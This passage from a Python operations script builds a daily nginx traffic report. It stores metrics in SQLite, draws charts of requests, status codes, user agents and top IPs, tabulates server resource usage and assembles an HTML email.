import os
import re
import json
from io import BytesIO
import gzip
from collections import defaultdict
import base64
import sqlite3
import multiprocessing
import requests
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
from matplotlib.ticker import FuncFormatter
from matplotlib import font_manager
import seaborn as sns
from datetime import datetime, timedelta
import smtplib
from email.header import Header
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import parseaddr, formataddr

# 指定字体路径（更换为你的字体文件路径）
font_path = "./simkai.ttf"
# 加载字体
custom_font = font_manager.FontProperties(fname=font_path)

html = """
<!doctype html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <title>日报</title>
</head>
<style>
    body {
        font-family: Arial;
    }
    .styled-table {
        width: 100%%;
        border-collapse: collapse;
        margin-bottom: 10px;
    }
    .styled-table th {
        background-color: #e0e0e0;
        padding: 8px;
        text-align: center;
    }
    .styled-table td {
        padding: 0;
        text-align: center;
    }
    .styled-table tr:nth-child(even) {
        background-color: #f2f2f2;
    }
    .styled-table tr:hover {
        background-color: #ddd;
    }
    h3,img{
        margin-bottom: 10px:
    }
</style>
<body>
    %s
</body>
</html>
"""

def load_config():
    with open("nginx_config.json", 'r') as f:
        config = json.load(f)
    return config

def py3_get_pwd(ip,date):
    url = "https://firedesigns.com.cn/pwd/query?ip={}&date={}".format(ip, date)
    headers = {'Content-Type': 'application/json'}
    res = requests.get(url,headers=headers)
    data = res.json()
    jsondata = data["jsondata"]
    pwd = json.loads(jsondata)["pwd"]
    return pwd

# 初始化数据库，创建数据表
def init_db():
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()

        # 创建主访问数据表
        cursor.execute('''CREATE TABLE IF NOT EXISTS traffic_data (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            date DATE,
                            total_requests INTEGER,
                            success_rate REAL,
                            req_times_3000 INTEGER,
                            avg_latency REAL,
                            unique_ips INTEGER
                        )''')

        # 创建模块数据表
        cursor.execute('''CREATE TABLE IF NOT EXISTS module_data (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            date DATE,
                            module_name TEXT,
                            total_requests INTEGER,
                            success_rate REAL,
                            avg_latency REAL
                        )''')

        conn.commit()
        conn.close()
    except Exception as e:
        print(e)

# 插入每日统计数据到数据库
def insert_or_update_daily_data(date, total_requests, success_rate,req_times_3000, avg_latency, unique_ips, module_metrics):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    # 检查是否已经有该日期的数据
    cursor.execute('''SELECT COUNT(*) FROM traffic_data WHERE date = ?''', (date,))
    count = cursor.fetchone()[0]

    if count > 0:
        # 数据已经存在，更新数据
        cursor.execute('''
            UPDATE traffic_data
            SET total_requests = ?, success_rate = ?, req_times_3000 = ?,avg_latency = ?, unique_ips = ?
            WHERE date = ?
        ''', (total_requests, success_rate,req_times_3000, avg_latency, unique_ips, date))
    else:
        # 数据不存在，插入新数据
        cursor.execute('''INSERT INTO traffic_data (date, total_requests, success_rate,req_times_3000, avg_latency, unique_ips)
                          VALUES (?, ?, ?, ?, ?, ?)''', (date, total_requests, success_rate,req_times_3000, avg_latency, unique_ips))

    # 对每个模块，检查是否已有数据，如果有则更新，如果没有则插入
    for module, metrics in module_metrics.items():
        cursor.execute('''SELECT COUNT(*) FROM module_data WHERE date = ? AND module_name = ?''', (date, module))
        count = cursor.fetchone()[0]

        if count > 0:
            # 数据已经存在，更新模块数据
            cursor.execute('''
                UPDATE module_data
                SET total_requests = ?, success_rate = ?, avg_latency = ?
                WHERE date = ? AND module_name = ?
            ''', (metrics['total_requests'], metrics['success_rate'], metrics['avg_latency'], date, module))
        else:
            # 数据不存在，插入模块数据
            cursor.execute('''INSERT INTO module_data (date, module_name, total_requests, success_rate, avg_latency)
                              VALUES (?, ?, ?, ?, ?)''', (date, module, metrics['total_requests'], metrics['success_rate'], metrics['avg_latency']))

    # 提交事务并关闭连接
    conn.commit()
    conn.close()

# 获取近8天的数据
def get_recent_data():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    # 获取今天的日期
    today = datetime.now().date()

    # 获取近8天的数据
    date_8_days_ago = today - timedelta(days=8)
    cursor.execute('''SELECT date, total_requests, success_rate,req_times_3000, avg_latency, unique_ips FROM traffic_data WHERE date >= ? ORDER BY date ASC''', (date_8_days_ago,))
    traffic_data = cursor.fetchall()

    # 获取近8天的模块数据
    module_metrics = {}
    cursor.execute('''SELECT date, module_name, total_requests, success_rate, avg_latency FROM module_data WHERE date >= ? ORDER BY date ASC''', (date_8_days_ago,))
    module_data = cursor.fetchall()
    for row in module_data:
        date, module_name, total_requests, success_rate, avg_latency = row
        # 当模块没在配置module_urls中时则不统计
        if module_name not in config["module_urls"]:
            continue
        if module_name not in module_metrics:
            module_metrics[module_name] = []
        module_metrics[module_name].append((date, total_requests, success_rate, avg_latency))


    # 获取近8天的日期
    cursor.execute('''SELECT DISTINCT date FROM traffic_data WHERE date >= ? ORDER BY date ASC''', (date_8_days_ago,))
    dates = [row[0] for row in cursor.fetchall()]

    conn.close()

    return traffic_data, module_metrics, dates

# 绘制模块数据的趋势图
def generate_module_trend_images(module_data,dates):
    """
       根据模块数据生成访问量、成功率和时延的趋势图，并返回BytesIO格式的图片数据。
       """
    images = {}

    # 访问量趋势图
    plt.figure(figsize=(12, 6))
    for module, metrics in module_data.items():
        traffic = [data[1] for data in metrics]
        plt.plot(dates, traffic, label=f'{module}')

    plt.title('访问量指标趋势', loc='left', pad=50, fontproperties=custom_font, fontsize=18)
    plt.xlabel('日期', fontproperties=custom_font, fontsize=15)
    plt.ylabel('访问量', fontproperties=custom_font, fontsize=15)

    # 定义格式化函数，避免科学计数法，显示完整数字
    def format_y_ticks(x, pos):
        return '{:.0f}'.format(x)  # 格式化为普通整数

    plt.gca().yaxis.set_major_formatter(FuncFormatter(format_y_ticks))  # 应用自定义的格式化器到y轴
    plt.tick_params(axis='y', labelsize=12)  # 调整y轴刻度标签的字体大小
    plt.xticks(rotation=45)

    # 调整左侧的间距以便更好地显示y轴的标签
    plt.subplots_adjust(left=0.1, right=0.95, top=0.9, bottom=0.2)

    plt.legend(loc='upper center', bbox_to_anchor=(0.5, 1.15), ncol=len(module_data), prop=custom_font)  # 置于图片正上方
    plt.tight_layout(rect=[0, 0, 1, 0.9])  # 调整布局，使图例不会遮挡图形

    img_stream = BytesIO()
    plt.savefig(img_stream, format='png')
    img_stream.seek(0)
    images['access_volume'] = img_stream
    plt.close()

    # 成功率柱状图
    plt.figure(figsize=(12, 6))
    x = list(range(len(dates)))
    n_modules = len(module_data)
    width = 0.8 / n_modules

    for i, (module, metrics) in enumerate(module_data.items()):
        success_rate = [data[2] for data in metrics]
        x_offset = [xi + i * width for xi in x]
        plt.bar(x_offset, success_rate, width=width, label=f'{module}')

    xtick_positions = [xi + width * (n_modules - 1) / 2 for xi in x]
    plt.title('成功率指标趋势',loc='left', pad=50,fontproperties=custom_font,fontsize=18)
    plt.xlabel('日期',fontproperties=custom_font,fontsize=15)
    plt.ylabel('成功率',fontproperties=custom_font,fontsize=15)
    plt.xticks(xtick_positions, dates, rotation=45)
    plt.legend(loc='upper center', bbox_to_anchor=(0.5, 1.15), ncol=len(module_data),prop=custom_font)
    plt.tight_layout(rect=[0, 0, 1, 0.9])

    img_stream = BytesIO()
    plt.savefig(img_stream, format='png')
    img_stream.seek(0)
    images['success_rate'] = img_stream
    plt.close()

    # 时延趋势图
    plt.figure(figsize=(12, 6))
    for module, metrics in module_data.items():
        latency = [data[3] for data in metrics]
        plt.plot(dates, latency, label=f'{module}')

    plt.title('时延指标趋势',loc='left', pad=50,fontproperties=custom_font,fontsize=18)
    plt.xlabel('日期',fontproperties=custom_font,fontsize=15)
    plt.ylabel('时延(秒)',fontproperties=custom_font,fontsize=15)
    plt.xticks(rotation=45)
    plt.legend(loc='upper center', bbox_to_anchor=(0.5, 1.15), ncol=len(module_data),prop=custom_font)
    plt.tight_layout(rect=[0, 0, 1, 0.9])

    img_stream = BytesIO()
    plt.savefig(img_stream, format='png')
    img_stream.seek(0)
    images['latency'] = img_stream
    plt.close()

    return images


# 生成今日每小时访问量趋势图
def plot_hourly_traffic_trend(log_dict):
    hourly_traffic = log_dict['hourly_traffic']
    hours = list(hourly_traffic.keys())  # 小时（0-23）
    traffic_counts = list(hourly_traffic.values())  # 访问量

    plt.figure(figsize=(14, 6))  # 调整宽高

    # 画折线图
    sns.lineplot(x=hours, y=traffic_counts, marker='o')

    # 设置标题，左对齐
    plt.title(f'{(datetime.now() - timedelta(days=1)).date()} 访问量趋势',loc='center',pad=30,fontproperties=custom_font,fontsize=18)

    # X 轴设置 0-23 全部显示
    plt.xticks(range(24), rotation=0,fontproperties=custom_font)

    plt.xlabel('小时',fontproperties=custom_font,fontsize=15)
    plt.ylabel('访问量',fontproperties=custom_font,fontsize=15)

    def format_y_ticks(x, pos):
        return '{:.0f}'.format(x)  # 格式化为普通整数
    plt.gca().yaxis.set_major_formatter(FuncFormatter(format_y_ticks))
    # 调整左侧的间距以便更好地显示y轴的标签
    plt.subplots_adjust(left=0.1, right=0.95, top=0.9, bottom=0.2)

    plt.grid(True, linestyle='--', alpha=0.6)  # 轻微虚线网格提高可读性

    # 保存图像
    img_stream = BytesIO()
    plt.savefig(img_stream, format='png')
    img_stream.seek(0)
    plt.close()

    return img_stream

# 状态码占比饼图
def plot_status_code_pie(log_dict):
    status_codes = log_dict['status_codes']
    labels = list(status_codes.keys())
    sizes = list(status_codes.values())

    # 使用颜色
    colors = ['#1f77b4', '#ff7f0e', '#2ca02c', '#d62728','#9467bd', '#8c564b'][:len(labels)]

    # 按照占比大小倒序排列
    sorted_indices = np.argsort(sizes)[::-1]  # 获取倒序排列的索引
    sorted_labels = [labels[i] for i in sorted_indices]
    sorted_sizes = [sizes[i] for i in sorted_indices]
    sorted_colors = [colors[i] for i in sorted_indices]

    # 绘制饼图
    plt.figure(figsize=(6, 6))
    wedges, _ = plt.pie(sorted_sizes, startangle=140, colors=sorted_colors, pctdistance=0.85, wedgeprops={'edgecolor': 'black'})

    # 计算百分比标签
    total = sum(sorted_sizes)
    percentage_labels = [f'{label}: {size / total * 100:.2f}%' for label, size in zip(sorted_labels, sorted_sizes)]

    # 使用图例显示百分比
    handles = [plt.Line2D([0], [0], marker='o', color='w', markerfacecolor=sorted_colors[i], markersize=10) for i in range(len(sorted_labels))]
    plt.legend(handles=handles, labels=percentage_labels, title="", loc='center left', bbox_to_anchor=(1, 0.5), fontsize=8)

    plt.title(f"{(datetime.now() - timedelta(days=1)).date()} 状态码占比", fontsize=12, fontproperties=custom_font)

    # 保存图像到 img_stream
    img_stream = BytesIO()
    plt.savefig(img_stream, format='png', bbox_inches='tight')  # bbox_inches='tight'确保图例不被裁切
    img_stream.seek(0)  # 重置流的指针

    # 将 img_stream 中的数据保存为本地文件
    plt.close()

    return img_stream

# 请求方法占比饼图
def plot_method_pie(log_dict):
    method_count = log_dict['method_count']
    labels = list(method_count.keys())
    sizes = list(method_count.values())

    # 使用颜色
    colors = ['#1f77b4', '#ff7f0e', '#2ca02c', '#d62728', '#9467bd', '#8c564b', '#7f7f7f', '#e377c2', '#f0e442', '#c5b0d5', '#ff69b4', '#98df8a', '#8c564b', '#ffb6c1', '#ff6347']

    # 按照占比大小倒序排列
    sorted_indices = np.argsort(sizes)[::-1]  # 获取倒序排列的索引
    sorted_labels = [labels[i] for i in sorted_indices]
    sorted_sizes = [sizes[i] for i in sorted_indices]
    sorted_colors = [colors[i] for i in sorted_indices]

    # 绘制饼图
    plt.figure(figsize=(6, 6))
    wedges, _ = plt.pie(sorted_sizes, startangle=140, colors=sorted_colors, pctdistance=0.85, wedgeprops={'edgecolor': 'black'})

    # 计算百分比标签
    total = sum(sorted_sizes)
    percentage_labels = [f'{label}: {size / total * 100:.2f}%' for label, size in zip(sorted_labels, sorted_sizes)]

    # 使用图例显示百分比
    handles = [plt.Line2D([0], [0], marker='o', color='w', markerfacecolor=sorted_colors[i], markersize=10) for i in range(len(sorted_labels))]
    plt.legend(handles=handles, labels=percentage_labels, title="", loc='center left', bbox_to_anchor=(1, 0.5), fontsize=8)

    plt.title(f"{(datetime.now() - timedelta(days=1)).date()} 请求方法数量占比", fontsize=12, fontproperties=custom_font)

    # 保存图像到 img_stream
    img_stream = BytesIO()
    plt.savefig(img_stream, format='png', bbox_inches='tight')  # bbox_inches='tight'确保图例不被裁切
    img_stream.seek(0)  # 重置流的指针

    # 将 img_stream 中的数据保存为本地文件
    plt.close()

    return img_stream

# User-Agent占比饼图
def plot_user_agent_pie(log_dict):
    user_agent_count = log_dict['user_agent_count']
    labels = list(user_agent_count.keys())
    sizes = list(user_agent_count.values())

    # 使用颜色
    colors = ['#1f77b4', '#ff7f0e', '#2ca02c', '#d62728', '#9467bd', '#8c564b', '#7f7f7f', '#e377c2', '#f0e442', '#c5b0d5']

    # 按照占比大小倒序排列
    sorted_indices = np.argsort(sizes)[::-1]  # 获取倒序排列的索引
    sorted_labels = [labels[i] for i in sorted_indices]
    sorted_sizes = [sizes[i] for i in sorted_indices]
    sorted_colors = [colors[i] for i in sorted_indices]

    # 绘制饼图
    plt.figure(figsize=(6, 6))  # 设置饼图大小
    wedges, _ = plt.pie(sorted_sizes, startangle=90, colors=sorted_colors, pctdistance=0.85, wedgeprops={'edgecolor': 'black'})

    # 计算百分比标签
    total = sum(sorted_sizes)
    percentage_labels = [f'{label}: {size / total * 100:.2f}%' for label, size in zip(sorted_labels, sorted_sizes)]

    # 使用图例显示百分比
    # handles = [plt.Line2D([0], [0], marker='o', color='w', markerfacecolor=sorted_colors[i], markersize=10) for i in range(len(sorted_labels))]
    # plt.legend(handles=handles, labels=percentage_labels, title="", loc='center left', bbox_to_anchor=(1, 0.5), fontsize=8)

    # 手动绘制图例
    legend_x = 1.2  # 适当调整 x 位置
    legend_y = 0.5  # 适当调整 y 位置

    for i, (label, color) in enumerate(zip(percentage_labels, sorted_colors)):
        plt.text(legend_x, legend_y - i * 0.08, label, fontsize=8, color=color, fontproperties=custom_font)

    # 设置标题
    plt.title(f"{(datetime.now() - timedelta(days=1)).date()} User-Agent端类型数量占比", fontproperties=custom_font, fontsize=10)

    # 保存图像到 img_stream
    img_stream = BytesIO()
    plt.savefig(img_stream, format='png', bbox_inches='tight')  # bbox_inches='tight'确保图例不被裁切
    img_stream.seek(0)  # 重置流的指针

    # 将 img_stream 中的数据保存为本地文件
    plt.close()

    return img_stream

# Top 10 来源IP的条形柱状图
def plot_top_ips(log_dict):
    ip_counts = log_dict['ip']
    # 获取Top 10 IP
    top_ips = sorted(ip_counts.items(), key=lambda x: x[1], reverse=True)[:10]
    ips = [ip[0] for ip in top_ips]
    counts = [ip[1] for ip in top_ips]

    # 使用一个简单的色彩渐变
    colors = ['#1f77b4', '#ff7f0e', '#2ca02c', '#d62728', '#9467bd', '#8c564b', '#7f7f7f', '#e377c2', '#f0e442',
              '#8c564b']

    # 绘制条形柱状图
    plt.figure(figsize=(14, 6))
    plt.barh(ips, counts, color=colors[:len(ips)])

    plt.xlabel('访问量', fontproperties=custom_font)
    plt.ylabel('IP地址', fontproperties=custom_font)
    plt.title(f"{(datetime.now() - timedelta(days=1)).date()} Top 10 来源IP", fontproperties=custom_font, fontsize=16)

    # 调整x轴为普通整数格式
    def format_x_ticks(x, pos):
        return '{:.0f}'.format(x)  # 显示为普通整数

    plt.gca().xaxis.set_major_formatter(FuncFormatter(format_x_ticks))  # 应用格式化器

    # 旋转x轴标签以避免拥挤
    plt.xticks(rotation=45)

    # 反转y轴，IP按访问量排序
    plt.gca().invert_yaxis()

    # 调整图形的布局，增加y轴标签的空间并增加底部空间
    plt.subplots_adjust(left=0.2, bottom=0.2)  # 增加底部的空间以显示x轴标签

    # 保存图像
    img_stream = BytesIO()
    plt.savefig(img_stream, format='png')
    img_stream.seek(0)
    plt.close()

    return img_stream, ips, counts

def get_res_data():
    # 删除昨日的数据
    def delete_yesterday_before_data():
        try:
            conn = sqlite3.connect('metrics.db')
            cursor = conn.cursor()
            yesterday_date = get_date(days=2)
            # 删除昨日的数据
            cursor.execute("""
                DELETE FROM metrics WHERE strftime('%Y%m%d', timestamp) = ?
            """, (yesterday_date,))

            conn.commit()
        except Exception as e:
            print(e)
        finally:
            cursor.close()
            conn.close()

    def get_date(days=1):
        return (datetime.now() - timedelta(days=days)).strftime('%Y%m%d')

    def fetch_and_compute_metrics():
        try:
            conn = sqlite3.connect('metrics.db')
            cursor = conn.cursor()
            today_date = get_date(days=1)

            # 查询当天的所有数据
            cursor.execute("""
                SELECT ip, cpu_usage, cpu_load_5m, memory_usage, io_util, tcp_connections, disk_usages_json, timestamp
                FROM metrics
                WHERE strftime('%Y%m%d', timestamp) = ?
            """, (today_date,))

            rows = cursor.fetchall()
        except Exception as e:
            print(e)
        finally:
            cursor.close()
            conn.close()

        # 计算每个IP的指标数据
        result = {}
        for row in rows:
            ip, cpu_usage, cpu_load_5m, memory_usage, io_util, tcp_connections, disk_usages_json, timestamp = row
            disk_usages = json.loads(disk_usages_json)

            if ip not in result:
                result[ip] = {
                    'cpu_usage': [],
                    'cpu_load_5m': [],
                    'memory_usage': [],
                    'io_util': [],
                    'tcp_connections': [],
                    'disk_usages': {},
                }

            # 收集CPU、内存、IO、连接数
            result[ip]['cpu_usage'].append(cpu_usage)
            result[ip]['cpu_load_5m'].append(cpu_load_5m)
            result[ip]['memory_usage'].append(memory_usage)
            result[ip]['io_util'].append(io_util)
            result[ip]['tcp_connections'].append(tcp_connections)

            # 收集磁盘使用率，取当天最大值
            for disk in disk_usages:
                mount_point = disk['mount_point']
                if mount_point not in result[ip]['disk_usages']:
                    result[ip]['disk_usages'][mount_point] = []
                result[ip]['disk_usages'][mount_point].append(disk['usage_percent'])

        # 计算每个IP的最大值、最小值、平均值
        report_data = []
        for ip, data in result.items():
            # 计算每项指标的最大、最小、平均值
            metrics = {
                'ip': ip,
                'cpu_usage': {'max': round(max(data['cpu_usage']), 2), 'min': round(min(data['cpu_usage']), 2),
                              'avg': round(sum(data['cpu_usage']) / len(data['cpu_usage']), 2)},
                'cpu_load_5m': {'max': round(max(data['cpu_load_5m'])), 'min': round(min(data['cpu_load_5m'])),
                                'avg': round(sum(data['cpu_load_5m']) / len(data['cpu_load_5m']))},
                'memory_usage': {'max': round(max(data['memory_usage']), 2), 'min': round(min(data['memory_usage']), 2),
                                 'avg': round(sum(data['memory_usage']) / len(data['memory_usage']), 2)},
                'io_util': {'max': round(max(data['io_util']), 2), 'min': round(min(data['io_util']), 2),
                            'avg': round(sum(data['io_util']) / len(data['io_util']), 2)},
                'tcp_connections': {'max': max(data['tcp_connections']), 'min': min(data['tcp_connections']),
                                    'avg': round(sum(data['tcp_connections']) / len(data['tcp_connections']), 2)},
                'disk_usages': {},
            }

            # 获取磁盘的最大使用率
            for mount_point, usages in data['disk_usages'].items():
                metrics['disk_usages'][mount_point] = round(max(usages), 2)

            # 获取日期
            metrics['date'] = today_date

            report_data.append(metrics)

        return report_data


    def generate_html_report(report_data):
        html = """
            <table style="width: 100%; border-collapse: collapse;">
                <thead>
                    <tr>
                        <th style="border: 1px solid black; padding: 8px; text-align: center; background-color: #e0e0e0;">业务IP</th>
                        <th style="border: 1px solid black; padding: 8px; text-align: center; background-color: #e0e0e0;">cpu使用率（%）</th>
                        <th style="border: 1px solid black; padding: 8px; text-align: center; background-color: #e0e0e0;">cpu负载</th>
                        <th style="border: 1px solid black; padding: 8px; text-align: center; background-color: #e0e0e0;">内存消耗（%）</th>
                        <th style="border: 1px solid black; padding: 8px; text-align: center; background-color: #e0e0e0;">IO消耗（%）</th>
                        <th style="border: 1px solid black; padding: 8px; text-align: center; background-color: #e0e0e0;">磁盘使用率（%）</th>
                        <th style="border: 1px solid black; padding: 8px; text-align: center; background-color: #e0e0e0;">tcp连接数(established状态)</th>
                        <th style="border: 1px solid black; padding: 8px; text-align: center; background-color: #e0e0e0;">日期</th>
                    </tr>
                </thead>
        """
        strStr = ""
        for data in report_data:
            # 处理磁盘使用率
            disk_usage_str = "<br>".join(
                [f"{mount_point} => {usage}" for mount_point, usage in data['disk_usages'].items()])

            # 构建表格行
            strStr += f"""
                <tr>
                    <td style="border: 1px solid black; padding: 8px; text-align: center;">{data['ip']}</td>
                    <td style="border: 1px solid black; padding: 8px; text-align: center;">max=>{data['cpu_usage']['max']}<br>avg=>{data['cpu_usage']['avg']}<br>min=>{data['cpu_usage']['min']}</td>
                    <td style="border: 1px solid black; padding: 8px; text-align: center;">max=>{data['cpu_load_5m']['max']}<br>avg=>{data['cpu_load_5m']['avg']}<br>min=>{data['cpu_load_5m']['min']}</td>
                    <td style="border: 1px solid black; padding: 8px; text-align: center;">max=>{data['memory_usage']['max']}<br>avg=>{data['memory_usage']['avg']}<br>min=>{data['memory_usage']['min']}</td>
                    <td style="border: 1px solid black; padding: 8px; text-align: center;">max=>{data['io_util']['max']}<br>avg=>{data['io_util']['avg']}<br>min=>{data['io_util']['min']}</td>
                    <td style="border: 1px solid black; padding: 8px; text-align: center;">{disk_usage_str}</td>
                    <td style="border: 1px solid black; padding: 8px; text-align: center;">max=>{data['tcp_connections']['max']}<br>avg=>{data['tcp_connections']['avg']}<br>min=>{data['tcp_connections']['min']}</td>
                    <td style="border: 1px solid black; padding: 8px; text-align: center;">{data['date']}</td>
                </tr>
            """
        if strStr:
            html += strStr
            html += """
                    </tbody>
                </table>
            """
            return html

    try:
        # 删除昨日前一天数据
        delete_yesterday_before_data()
        # 获取当天的指标数据，并计算最大值、最小值、平均值
        report_data = fetch_and_compute_metrics()

        # 生成HTML报告
        html_report = generate_html_report(report_data)
        if html_report:
            return html_report
    except Exception as e:
        print(e)

# 生成邮件内容并发送
def send_report_via_email(date=None,log_dict=None,service=None,today=None):
    print("\033[31m4.开始生成报告...\033[0m")
    def get_module_des(access_volume_data,success_rate_data,latency_data):
        res = ""
        for index,(access_item,success_item,latency_item) in enumerate(zip(access_volume_data,success_rate_data,latency_data),start=2):
            cur_accuss = access_item[-1]
            cur_success = success_item[-1]
            cur_latency = latency_item[-1]
            yes_accuss = access_item[-2]
            yes_success = success_item[-2]
            yes_latency = latency_item[-2]
            is_ok = '<span style="color: #FF0000">差</span>' if cur_latency > 3 or cur_success < 95  else '<span style="color: #008000">良好</span>'
            if yes_accuss > 0:
                accuss_risk = f'<span style="color: #008000">上升{round((cur_accuss - yes_accuss) / yes_accuss * 100, 2)}%</span>' if (cur_accuss - yes_accuss) >= 0 else f'<span style="color: #FF0000">下降{abs(round((cur_accuss - yes_accuss) / yes_accuss * 100, 2))}%</span>'
            else:
                accuss_risk = f'<span style="color: #008000">上升{cur_accuss}</span>'
            if yes_success > 0:
                success_risk = f'<span style="color: #008000">上升{round(cur_success - yes_success,2)}个百分点</span>' if (cur_success - yes_success) >= 0 else f'<span style="color: #FF0000">下降{abs(round(cur_success - yes_success,2))}个百分点</span>'
            else:
                success_risk = f'<span style="color: #008000">上升{cur_success}个百分点</span>'

            if yes_latency > 0:
                latency_risk = f'<span style="color: #FF0000">上升{round((cur_latency - yes_latency) / yes_latency * 100, 2)}%</span>' if (cur_latency - yes_latency) >= 0 else f'<span style="color: #008000">下降{abs(round((cur_latency - yes_latency) / yes_latency * 100, 2))}%</span>'
            else:
                latency_risk = f'<span style="color: #FF0000">上升{cur_latency}s</span>'

            res += f"""
            <p>{index}.《{access_item[0]}》（{is_ok}）: 访问量<span style="color: #FF0000">{cur_accuss}</span>，较昨日{accuss_risk}，成功率<span style="color: #FF0000">{cur_success}%</span>，较昨日{success_risk}，时延<span style="color: #FF0000">{round(cur_latency,2)}s</span>，较昨日{latency_risk}</p>
            """.strip()
        return res

    # 获取近8天的数据
    traffic_data, module_metrics, dates = get_recent_data()

    # 昨日数据
    yesterday = (datetime.now() - timedelta(days=1)).date()
    yesterday_data = next((row for row in traffic_data if row[0] == yesterday.strftime('%Y-%m-%d')), None)
    date_8_days_ago = (datetime.now() - timedelta(days=8)).date()
    date_8_days_ago_data = next((row for row in traffic_data if row[0] == date_8_days_ago.strftime('%Y-%m-%d')), None)

    if yesterday_data:
        total_requests, success_rate,req_times_3000, avg_latency, unique_ips = yesterday_data[1:]
    else:
        total_requests = success_rate = req_times_3000 = avg_latency = unique_ips = 0

    if date_8_days_ago_data:
        date_8_days_total_requests,date_8_days_unique_ips = date_8_days_ago_data[1:][0],date_8_days_ago_data[1:][-1]
    else:
        date_8_days_total_requests = date_8_days_unique_ips = 0

    status = '<span style="color: #FF0000">差</span>' if avg_latency > 3 or success_rate < 95  else '<span style="color: #008000">良好</span>'
    if  date_8_days_total_requests > 0:
        total_requests_risk = f'<span style="color: #008000">上升{round((total_requests - date_8_days_total_requests)/date_8_days_total_requests * 100,2)}%</span>' if (total_requests - date_8_days_total_requests) >= 0 else f'<span style="color: #FF0000">下降{abs(round((total_requests - date_8_days_total_requests)/date_8_days_total_requests * 100,2))}%</span>'
    else:
        total_requests_risk = f'<span style="color: #008000">上升{total_requests}</span>'
    if date_8_days_unique_ips > 0:
        unique_ips_risk = f'<span style="color: #008000">上升{round((unique_ips - date_8_days_unique_ips)/date_8_days_unique_ips * 100,2)}%</span>' if (unique_ips - date_8_days_unique_ips) >= 0 else f'<span style="color: #FF0000">下降{abs(round((unique_ips - date_8_days_unique_ips)/date_8_days_unique_ips * 100,2))}%</span>'
    else:
        unique_ips_risk = f'<span style="color: #008000">上升{unique_ips}</span>'

    # 附图
    images = generate_module_trend_images(module_metrics, dates)

    # 生成模块数据报告
    module_report_html = ""
    # 每小时访问量趋势
    # 绘制今日小时访问量趋势图
    hourly_traffic_img = plot_hourly_traffic_trend(log_dict)
    module_report_html += f"<h3>附1：近一天访问量指标趋势</h3>"
    module_report_html += f'''<img src="data:image/png;base64,{base64.b64encode(hourly_traffic_img.getvalue()).decode()}" style="margin: 0 auto;width: 100%;">'''
    # 绘制今日状态码占比饼图
    status_code_img = plot_status_code_pie(log_dict)
    module_report_html += f"<h3>附2：近一天状态码占比</h3>"
    module_report_html += f'''<img src="data:image/png;base64,{base64.b64encode(status_code_img.getvalue()).decode()}" style="margin: 0 auto;">'''

    # 绘制今日请求方法占比饼图
    method_pie_img = plot_method_pie(log_dict)
    module_report_html += f"<h3>附3：近一天请求方法占比</h3>"
    headers = ["请求方法","访问量","成功量","失败量","成功率(%)"]
    method_success = log_dict['method_success']
    method_data = []
    sort_data = sorted(method_success.items(), key=lambda item: sum(item[1].values()), reverse=True)
    for method,value in sort_data:
        total = sum(value.values())
        success = value.get("success",0)
        failure = value.get("failure",0)
        successrate = round(float(success) / total * 100, 2)
        method_data.append([method,total,success,failure,successrate])

    method_df = pd.DataFrame(method_data, columns=headers)
    module_report_html += method_df.to_html(index=False, escape=False, classes="styled-table")
    module_report_html += f'''<img src="data:image/png;base64,{base64.b64encode(method_pie_img.getvalue()).decode()}" style="margin: 0 auto;">'''

    # 绘制今日User-Agent占比饼图
    user_agent_pie_img = plot_user_agent_pie(log_dict)
    module_report_html += f"<h3>附4：近一天客户端类型请求占比</h3>"
    headers = ["客户端", "访问量", "成功量", "失败量", "成功率(%)"]
    user_agent_success = log_dict['user_agent_success']
    user_agent_data = []
    sort_data = sorted(user_agent_success.items(), key=lambda item: sum(item[1].values()), reverse=True)
    for user_agent, value in sort_data:
        total = sum(value.values())
        success = value.get("success", 0)
        failure = value.get("failure", 0)
        successrate = round(float(success) / total * 100, 2)
        user_agent_data.append([user_agent, total, success, failure, successrate])
    user_agent_df = pd.DataFrame(user_agent_data, columns=headers)
    module_report_html += user_agent_df.to_html(index=False, escape=False, classes="styled-table")
    module_report_html += f'''<img src="data:image/png;base64,{base64.b64encode(user_agent_pie_img.getvalue()).decode()}" style="margin: 0 auto;">'''

    # 绘制Top10来源IP
    top_ips_img,ips,counts = plot_top_ips(log_dict)
    module_report_html += f"<h3>附5：近一天Top10 来源IP</h3>"
    # 条形柱状图
    module_report_html += f'''<img src="data:image/png;base64,{base64.b64encode(top_ips_img.getvalue()).decode()}" style="margin: 0 auto;width: 100%;">'''

    # 超时数据
    timeoutdata = sorted(log_dict['request_url_data'].items(), key=lambda x: x[1]["req_times_5001_more"], reverse=True)
    # 错误数据
    errordata = sorted(log_dict['request_url_data'].items(), key=lambda x: x[1]["fail"], reverse=True)
    # 近一天的TOP10超时率指标趋势
    module_report_html += f"""<h3>附6：近一天的TOP10超时率指标趋势(PS.按"<span style="color: #FF0000">5000ms以上</span>"从大到小排序)</h3>"""
    module_report_html += generateTrs_timeout(timeoutdata[0:10])
    # 近一天的TOP10错误率指标趋势
    module_report_html += f"""<h3>附7：近一天的TOP10错误率指标趋势(PS.按"<span style="color: #FF0000">失败量</span>"从大到小排序)</h3>"""
    module_report_html += generateTrs_error(errordata[0:10])

    # 访问量
    access_volume_data = []
    # 成功率
    success_rate_data = []
    # 时延
    latency_data = []
    for module, metrics in module_metrics.items():
        module_data1 = [data[1] for data in metrics]
        module_data2 = [data[2] for data in metrics]
        module_data3 = [data[3] for data in metrics]
        access_volume_data.append([module] + module_data1)
        success_rate_data.append([module] + module_data2)
        latency_data.append([module] + module_data3)

    # 生成访问量表格
    access_volume_df = pd.DataFrame(access_volume_data, columns=['Module'] + dates)
    module_report_html += f"<h3>附8：近一周关键指标访问量统计</h3>"
    module_report_html += access_volume_df.to_html(index=False,escape=False, classes="styled-table")
    # 附图访问量
    module_report_html += f'''<img src="data:image/png;base64,{base64.b64encode(images['access_volume'].getvalue()).decode()}" style="margin: 10px auto;width: 100%;">'''
    # 生成成功率表格
    success_rate_df = pd.DataFrame(success_rate_data, columns=['Module'] + dates)
    module_report_html += f"<h3>附9：近一周的成功率指标趋势</h3>"
    module_report_html += success_rate_df.to_html(index=False,escape=False, classes="styled-table")
